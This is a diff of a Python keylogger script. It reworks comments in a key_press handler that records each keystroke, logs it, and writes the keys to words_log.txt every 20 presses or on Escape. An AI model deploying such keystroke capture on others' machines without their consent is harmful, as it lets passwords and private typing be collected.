@@ -13,12 +13,14 @@ def key_press(key):
     keys.append(key)
     count += 1
     logging.info(str(key))
-    # Press Escape to exit the keylogger
+
+    # words_log.txt file is written after ever 20 key inputs or when Esc key is pressed to exit the program
     if count >= 20:
         count = 0
         write_file(keys)
         keys.clear()
 
+    # Press Escape to exit the keylogger
     if key == Key.esc:
         write_file(keys)
         keys.clear()
